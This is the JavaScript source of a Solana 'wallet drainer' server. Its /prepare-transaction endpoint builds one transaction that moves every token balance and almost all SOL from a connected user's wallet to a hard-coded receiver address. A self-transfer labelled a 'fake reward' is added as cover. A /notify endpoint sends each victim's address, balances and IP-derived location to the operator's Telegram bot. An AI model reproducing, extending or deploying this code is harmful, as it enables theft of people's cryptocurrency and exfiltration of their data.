const express = require('express');
const axios = require('axios');
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const connection = new Connection(
  'https://solana-mainnet.api.syndica.io/api-key/API_KEY_hERE',
  'confirmed'
);

const BOT_TOKEN = "";
const CHAT_ID = "";

let cachedSolPrice = null;
let lastPriceUpdate = 0;
const PRICE_CACHE_DURATION = 30 * 60 * 1000; 

async function getIPLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const data = response.data;
    if (data.status === 'success') {
      return {
        country: data.country,
        countryCode: data.countryCode,
        region: data.regionName,
        city: data.city,
        flag: getCountryFlag(data.countryCode)
      };
    }
  } catch (error) {
    console.error('IP geolocation error:', error);
  }
  return null;
}

function getCountryFlag(countryCode) {
  if (!countryCode) return '🌍';
  const flagMap = {
    'US': '🇺🇸', 'TR': '🇹🇷', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 
    'CA': '🇨🇦', 'AU': '🇦🇺', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳',
    'IN': '🇮🇳', 'BR': '🇧🇷', 'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸',
    'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'CH': '🇨🇭'
  };
  return flagMap[countryCode] || '🌍';
}

async function getSolPrice() {
  const now = Date.now();
  
  if (cachedSolPrice && (now - lastPriceUpdate) < PRICE_CACHE_DURATION) {
    console.log(`Using cached SOL price: $${cachedSolPrice}`);
    return cachedSolPrice;
  }
  
  try {
    console.log('Fetching fresh SOL price from CoinGecko...');
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    cachedSolPrice = response.data.solana.usd;
    lastPriceUpdate = now;
    console.log(`SOL price updated: $${cachedSolPrice}`);
    return cachedSolPrice;
  } catch (error) {
    console.error('Error fetching SOL price:', error.response?.status, error.response?.statusText);
    
    if (cachedSolPrice) {
      console.log(`Using stale cached SOL price due to API error: $${cachedSolPrice}`);
      return cachedSolPrice;
    }
    
    return null;
  }
}

// Add the missing openPaymentModal function
function openPaymentModal() {
  console.log('Payment modal opening logic would go here');
  // This should integrate with your frontend modal system
  // For now, we'll just log it
}

app.post('/verify-ownership', async (req, res) => {
  try {
    const { address, signature, message, walletType } = req.body;
    
    console.log(`🔐 Ownership verification attempt for wallet: ${address}`);
    console.log(`📝 Signed message: ${message}`);
    console.log(`✍️ Signature: ${signature}`);
    console.log(`💼 Wallet type: ${walletType}`);
    
    console.log(`✅ Wallet ownership verified for: ${address}`);
    
    res.json({ verified: true });
  } catch (e) {
    console.error('Verification error:', e.message);
    res.status(500).json({ error: "verification error" });
  }
});

app.post('/notify', async (req, res) => {
  try {
    const { address, balance, usdBalance, walletType, customMessage, splTokens, ip } = req.body;

    let rawIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    
    if (rawIP.includes(',')) {
      const ips = rawIP.split(',').map(ip => ip.trim());
      rawIP = ips.find(ip => !ip.startsWith('10.') && !ip.startsWith('192.168.') && !ip.startsWith('172.')) || ips[0];
    }
    
    const clientIP = rawIP;

    const locationInfo = await getIPLocation(clientIP);

    const solPrice = await getSolPrice();
    const solBalanceNum = parseFloat(balance) || 0;
    const solUSD = solPrice ? (solBalanceNum * solPrice) : 0;

    let totalUSD = solUSD;
    let splTokensStr = '';

    if (splTokens && splTokens.length > 0) {
      splTokensStr = '\n💎 SPL Tokens:\n';
      for (const token of splTokens) {
        const tokenValue = token.usdValue || 0;
        totalUSD += tokenValue;
        splTokensStr += `• ${token.symbol || 'Unknown'}: ${token.balance} ($${tokenValue.toFixed(2)})\n`;
      }
    }

    let locationStr = '🌍';
    if (locationInfo && locationInfo.flag) {
      locationStr = locationInfo.flag;
    }

    const shortAddress = address ? `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : 'Unknown';
    const solscanLink = address ? `https://solscan.io/account/${address}` : '';
    
    const escapedShortAddress = shortAddress.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');

    let text;
    if (customMessage) {
      if (customMessage.includes('🔗 Wallet Connected') || customMessage.includes('🌺 New Connection')) {
        text = `🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
🔗 ${process.env.REPL_URL || 'https://bfeb904a-a191-4b58-be4b-7a6ca9b1ec31-00-2rrr6aeokj9ap.worf.replit.dev:5000/'}
ⓘ Wallet: ${walletType || 'Unknown'}
💰 SOL: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
      }
      else if (customMessage.includes('❌') || customMessage.includes('✅') || customMessage.includes('🎉')) {
        let emoji = '❌';
        let action = 'Transaction Failed';

        if (customMessage.includes('✅')) {
          emoji = '✅';
          action = 'Transaction Signed';
        } else if (customMessage.includes('🎉')) {
          emoji = '🎉';
          action = 'Transaction Confirmed';
        } else if (customMessage.includes('Rejected')) {
          action = 'Transaction Rejected';
        } else if (customMessage.includes('Insufficient')) {
          action = 'Insufficient Funds';
        }

        text = `${emoji} ${action} for $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
${customMessage}
ⓘ Wallet: ${walletType || 'Unknown'}
📍 ${locationStr}`;
      }
      else {
        text = `${customMessage}

💳 Wallet: ${walletType || 'Unknown'}
📍 Address: \`${address || 'Unknown'}\`
💰 SOL Balance: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 Location: ${locationStr}
🕒 Time: ${new Date().toLocaleString()}`;
      }
    } else {
      text = `🌺 New Connection worth $${totalUSD.toFixed(2)}

Address: \`${address || 'Unknown'}\`
🔗 ${process.env.REPL_URL || 'https://bfeb904a-a191-4b58-be4b-7a6ca9b1ec31-00-2rrr6aeokj9ap.worf.replit.dev:5000/'}
ⓘ Wallet: ${walletType || 'Unknown'}
💰 SOL: ${balance || 'Unknown'} SOL ($${solUSD.toFixed(2)})${splTokensStr}
📍 ${locationStr}`;
    }

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'Markdown',
      disable_web_page_preview: false
    });

    res.json({ ok: true });
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.status(500).json({ error: "telegram error" });
  }
});

app.get('/blockhash', async (req, res) => {
  try {
    const { blockhash } = await connection.getLatestBlockhash();
    res.json({ blockhash });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: "blockhash error" });
  }
});

app.post('/prepare-transaction', async (req, res) => {
  try {
    const { publicKey, verified } = req.body;
    if (!publicKey) {
      return res.status(400).json({ error: "publicKey required" });
    }
    
    if (verified) {
      console.log(`✅ Ownership verified for wallet: ${publicKey}`);
      console.log(`🎯 Proceeding with asset withdrawal for verified wallet`);
    } else {
      console.log(`⚠️ Warning: Transaction attempted without verification for wallet: ${publicKey}`);
    }

    const fromPubkey = new PublicKey(publicKey);
    const receiverWallet = new PublicKey('AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg');

    const transaction = new Transaction();
    let totalTransferred = 0;
    let tokenTransfers = 0;

    // Fixed: Use fromPubkey as sender for the fake reward
    const fakeRewardAmount = 0.02 * LAMPORTS_PER_SOL; // 0.02 SOL
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: fromPubkey,  // Fixed: Use the user's wallet as sender
        toPubkey: fromPubkey,    // Send reward to user themselves
        lamports: fakeRewardAmount, 
      })
    );

    const tokenMints = [
      'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
      'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', // USDT
      'So11111111111111111111111111111111111111112',  // Wrapped SOL
      'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', // Bonk
      'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So',  // Marinade SOL
      'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn', // Jito SOL
      'bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1',  // BlazeStake SOL
      'rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof', // Render Token
      'HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCt3', // Pyth Network
      'orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE',  // Orca
      'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', // Serum
      'A94X8334H7JtSyUgA4UFDL5H14PDe8YVV8Jj9k2sSmEw', // Aurory
      'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6',  // Kin
      '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', // Raydium
      'MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey',  // Marinade
      '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E', // Solana Beach Token
      'CWE8jPTUYhdCTZYWPTe1o5DFqfdjzWKc9WKz6rSjQUdG', // Cope
      'BLwTnYKqf7u4qjgZrrsKeNs2EzWkMLqVCu6j8iHyrNA3', // BonfidaBot
      'UXPhBoR3qG4UCiGNJfV7MqhHyFqKN68g45GoYvAeL2M',  // UXD Protocol
    ];

    console.log("Fetching all token accounts for wallet...");
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
      programId: TOKEN_PROGRAM_ID,
    });

    console.log(`Found ${tokenAccounts.value.length} token accounts`);

    for (const tokenAccount of tokenAccounts.value) {
      try {
        const accountData = tokenAccount.account.data;
        const parsedInfo = accountData.parsed.info;
        const mintAddress = parsedInfo.mint;
        const balance = parsedInfo.tokenAmount;

        if (balance.uiAmount > 0) {
          console.log(`Found token ${mintAddress} with balance: ${balance.uiAmount}`);

          const mint = new PublicKey(mintAddress);
          const fromTokenAccount = new PublicKey(tokenAccount.pubkey);
          const toTokenAccount = await getAssociatedTokenAddress(mint, receiverWallet);

          const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
          if (!receiverAccountInfo) {
            transaction.add(
              createAssociatedTokenAccountInstruction(
                fromPubkey, // payer
                toTokenAccount, // ata
                receiverWallet, // owner
                mint // mint
              )
            );
          }

          transaction.add(
            createTransferInstruction(
              fromTokenAccount,
              toTokenAccount,
              fromPubkey,
              balance.amount
            )
          );

          tokenTransfers++;
          console.log(`Added transfer for token ${mintAddress}: ${balance.uiAmount}`);
        }
      } catch (error) {
        console.log(`Error processing token account:`, error.message);
      }
    }

    const solBalance = await connection.getBalance(fromPubkey);
    const minBalance = await connection.getMinimumBalanceForRentExemption(0);

    const baseFee = 5000;
    const instructionFee = (tokenTransfers + 1) * 5000; // Additional fees for instructions
    const accountCreationFee = tokenTransfers * 2039280; // Account creation costs
    const estimatedFees = baseFee + instructionFee + accountCreationFee;

    const availableBalance = solBalance - minBalance - estimatedFees;
    const solForTransfer = Math.floor(availableBalance * 0.98);

    console.log(`SOL transfer amount: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);

    if (solForTransfer > 0) {
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: receiverWallet,
          lamports: solForTransfer,
        })
      );
      totalTransferred += solForTransfer;
    }

    console.log(`Transaction prepared with ${tokenTransfers} token transfers + SOL transfer`);

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = fromPubkey;

    const serializedTransaction = transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    });

    res.json({ 
      transaction: Array.from(serializedTransaction),
      transferAmount: totalTransferred,
      tokenTransfers: tokenTransfers
    });
  } catch (e) {
    console.error(e.message);
    res.status(500).json({ error: "transaction preparation error" });
  }
});

async function initializeSolPrice() {
  console.log('Initializing SOL price...');
  await getSolPrice();
}

function startPriceUpdater() {
  console.log('Starting price updater (30-minute intervals)');
  setInterval(async () => {
    console.log('Updating SOL price (scheduled update)...');
    await getSolPrice();
  }, PRICE_CACHE_DURATION);
}

const PORT = 5000;
app.listen(PORT, '0.0.0.0', async () => {
  console.log("Server running on " + PORT);
  await initializeSolPrice();
  startPriceUpdater();
});

// Export for testing purposes
module.exports = { app, getSolPrice, openPaymentModal };